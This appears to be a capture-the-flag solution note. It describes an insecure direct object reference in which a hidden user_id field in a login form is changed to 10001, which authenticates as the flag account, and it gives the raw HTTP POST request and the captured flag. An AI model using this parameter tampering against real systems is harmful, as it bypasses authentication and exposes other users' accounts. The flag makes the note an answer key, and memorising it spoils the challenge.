# IDOR via hidden user_id field in login form. POST /password/test with user_id=10001 instead of 10032 authenticates as the flag account. Redirects to /dashboard showing flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}

POST /password/test HTTP/1.1
Host: 172.17.0.1:56629
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=test&user_id=10001&password=test